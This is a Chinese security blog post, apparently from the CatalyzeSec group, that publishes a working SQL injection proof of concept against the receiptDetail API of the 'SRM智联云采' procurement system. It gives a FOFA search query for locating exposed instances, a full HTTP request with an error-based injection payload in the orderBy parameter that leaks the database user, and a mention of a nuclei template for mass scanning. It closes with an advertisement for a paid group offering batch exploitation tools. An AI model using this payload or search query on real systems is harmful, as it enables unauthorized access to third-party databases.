#  SRM智联云采系统receiptDetail SQL注入漏洞复现及POC   
原创 CatalyzeSec  CatalyzeSec   2024-11-25 09:26  
  
# FOFA  
```
title=="SRM 2.0"
```  
# 漏洞复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykBd94QjdyXabuexdx4k31u5ImFKFOdY90quZWSpxKcsp1EjoYMO0ByRPywibiaT1ddDZfuWUGRVK4Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykBd94QjdyXabuexdx4k31u9mjjva6xdxUAeawBlxsia1yanJRUMuj46CrBSCHE9Zjx6ggibx7pUXgw/640?wx_fmt=png&from=appmsg "")  
  
POC  
```
GET /adpweb/api/srm/delivery/receiptDetail?pageSize=1&pageNumber=1&orderBy=-11%20AND%20(SELECT(0)FROM(SELECT%20COUNT(*),CONCAT_WS(0x28,0x7e,CURRENT_USER,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)--%20wXyW HTTP/1.1
Host:
Cache-Control: max-age=0
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```  
  
nuclei运行结果  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykBd94QjdyXabuexdx4k31udD2wGy5E3UZEZG7ZRicfL7KODUwptaBvAzsKY5CDjwjEmSRP1MLCYtw/640?wx_fmt=png&from=appmsg "")  
  
nuclei-POC已上传到知识星球  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykBd94QjdyXabuexdx4k31udqB9wBmcwAOTRQW0P1tLUhLSxMO1QibibRkDMYiaxk9MuWB6c9ib54MCKA/640?wx_fmt=png&from=appmsg "")  
  
高质量安全知识星球社区，致力于漏洞挖掘，渗透技巧，安全资料，星球承诺会持续更新0/1/NDay及对应的批量利用工具，团队内部漏洞库，内外网攻防技巧，你所需要的各类安全工具和资料以及团队师傅们最新的学习研究成果。分享行业内最新动态，解答交流各类技术问题。  
涉及方向包括Web渗透、免杀绕过、红蓝攻防、代码审计、应急响应、安全培训、CTF、小白入门、职业规划和疑难解答。**CatalyzeSec**  
，安全技术水平的催化者，星球针对成员的技术问题，快速提供思考方向及解决方案，并为星友提供多种方向的学习资料、安全工具、POC&EXP以及各种学习笔记等，以引导者和催化剂的方式助力安全技术水平的提升。  
我们是一个快速成长的team，团队的发展方向与每一位星友的学习方向密切相关，加入我们，一起成为更好的自己！  
PS：随着星球内知识的积累，人员的增加，  
星球价格也会随之增加，前一百位加入我们的师傅可享受99元朋友价！  
  
**微信群专属推送机器人**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykBd94QjdyXabuexdx4k31uPZNyosia973rtoWJ6mI2EPicwatgj84ViaHlOqzpGggjqjTJldfDB2Drg/640?wx_fmt=png&from=appmsg "")  
  
  
